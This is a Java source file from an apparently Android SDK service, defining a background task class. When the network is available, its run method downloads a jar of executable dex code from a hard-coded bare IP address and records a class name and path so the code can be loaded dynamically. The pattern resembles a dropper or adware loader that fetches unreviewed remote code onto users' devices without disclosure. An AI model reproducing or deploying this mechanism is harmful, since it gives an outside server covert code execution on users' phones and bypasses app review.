package cn.play.dserv;

import android.util.Log;

/**
 * more
 * @author tzx200
 *
 */
public class PLTask2 implements PLTask {

	public PLTask2() {
	}
	
	private SdkServ dservice;
	private int id = 2;
	private int state = STATE_WAITING;
	private static final String TAG = "PLTask2";
	private int result = -1;
	
//	private int runTimes = 6;

	@Override
	public void setDService(DServ serv) {
		this.dservice = (SdkServ) serv;
	}

	@Override
	public int getId() {
		return this.id;
	}

	@Override
	public void init() {
		Log.d(TAG, "PLTask2 inited.");
	}
	
	

	/* (non-Javadoc)
	 * @see java.lang.Runnable#run()
	 */
	@Override
	public void run() {
		Log.d(TAG, "2 is running...");
		state = STATE_RUNNING;
		while (true) {
			if (!CheckTool.isNetOk(dservice.getService())) {
				try {
					Thread.sleep(1000*60*10);
				} catch (InterruptedException e) {
				}
				continue;
			}
			String remote = "http://180.96.63.70:8080/plserver/dats/emv2.jar";
//			String localFile = SdkServ.getLocalDexPath()+"emv2.jar";
			if(dservice.downloadGoOn(remote, this.dservice.getLocalPath(), "emv2.jar",this.dservice.getService())){
				this.dservice.setEmvClass("cn.play.dserv.MoreView2");
				this.dservice.setEmvPath("emv2");
				this.dservice.saveConfig();
				Log.d(TAG, "down dex OK.emvClass:"+this.dservice.getEmvClass()+" emvPath:"+this.dservice.getEmvPath());
				state = STATE_DIE;
				result = 0;
			}else{
				result = -1;
				state = STATE_WAITING;
			}
			break;
		}
		Log.d(TAG, "task2 is done."+result);
	}


	@Override
	public int getState() {
		return this.state;
	}

	@Override
	public void setState(int state) {
		this.state = state;
	}



}
